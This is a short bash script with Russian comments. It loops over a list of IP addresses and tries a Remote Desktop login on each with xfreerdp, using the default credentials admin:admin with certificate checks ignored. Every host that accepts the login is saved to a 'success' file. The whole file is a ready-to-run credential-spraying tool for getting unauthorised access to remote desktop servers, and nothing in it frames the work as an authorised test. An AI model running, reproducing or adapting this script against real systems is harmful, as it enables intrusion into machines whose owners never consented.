#!/bin/bash

IP_LIST="ips/rdp_ips.txt"
OUTPUT_FILE="success/rdp_success.txt"
LOGIN="admin"
PASSWORD="admin"

# Очистим файл результатов
> "$OUTPUT_FILE"

# Проверка наличия xfreerdp
if ! command -v xfreerdp &> /dev/null; then
    echo "[!] xfreerdp не установлен."
    exit 1
fi

# Перебор IP
while read -r ip; do
    echo "[*] Пробую подключиться к $ip с $LOGIN:$PASSWORD"

    timeout 10s xfreerdp /v:$ip /u:$LOGIN /p:$PASSWORD +auth-only /cert:ignore > /dev/null 2>&1

    if [ $? -eq 0 ]; then
        echo "[✔] УСПЕШНО: $ip — $LOGIN:$PASSWORD"
        echo "$ip — $LOGIN:$PASSWORD" >> "$OUTPUT_FILE"
    else
        echo "[✘] НЕУДАЧА: $ip"
    fi
done < "$IP_LIST"
